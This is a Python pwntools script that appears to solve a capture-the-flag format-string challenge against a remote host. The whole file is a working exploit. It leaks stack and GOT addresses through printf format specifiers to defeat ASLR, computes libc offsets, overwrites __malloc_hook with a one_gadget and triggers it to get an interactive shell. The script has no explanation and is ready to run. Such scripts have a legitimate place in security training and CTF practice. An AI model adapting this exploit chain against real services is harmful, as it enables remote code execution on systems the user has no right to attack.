from pwn import *

HOST = '167.99.202.131'
PORT = 32399

context.arch = "amd64"

# -----------------------
def com(payload, wait=True):
	global r
	r.sendline(payload)
	if (wait):
		return r.recv()


def nonStopLeak():
	data = []
	min_val = 1
	max_val = 40
	log.progress("Starting nonStopLeaking (range: %d to %d)..." % (min_val, max_val))
	data.append("EMPTY ON PURPOSE")
	for i in range(min_val, max_val):
		leak = "%{}$lx".format(i)
		leak = com(leak).strip().decode()
		data.append(leak)

	log.success("nonStopLeaking finalized...")
	return data


# -------------- exploit -----------------------

elf = ELF("./format")

init_117 = 0x126d
# r = process("./format")
r = remote(HOST, PORT)
# input("[+] attach gdb")

payload = b'%37$p'
r.sendline(payload)

init_leak = r.recvline()
log.success("LEAK : init+117 address: {}".format(init_leak))
base_elf = int(init_leak,16) - 0x126d
log.info("Base ELF address: {}".format(hex(base_elf)))
elf.address = base_elf 

# ------------- Leaking _printf address through printf()
printf_got_ptl = elf.got["printf"]
log.info("printf@got.plt address: {}".format(hex(printf_got_ptl)))
r.sendline(b'AAAA%7$s' + p64(printf_got_ptl))
printf_leak = r.recv()
printf_libc = u64(printf_leak[4:10].ljust(8, b'\x00'))
log.success("Leaked __printf: {}".format(hex(printf_libc)))  

# Calculating base libc, __malloc_hook and one_gadget ---
base_libc = printf_libc - 0x64e80
malloc_hook_addr = base_libc + 0x00000000003ebc30
one_gadget = base_libc + 0x4f322

# Overriding __malloc_hook with one_gadget ---
r.sendline(fmtstr_payload(6, { malloc_hook_addr: one_gadget }))
r.recv()
r.sendline('%100000$c') # __malloc_hook trigger
log.info("trigged malloc_hook")
r.interactive()
r.close()

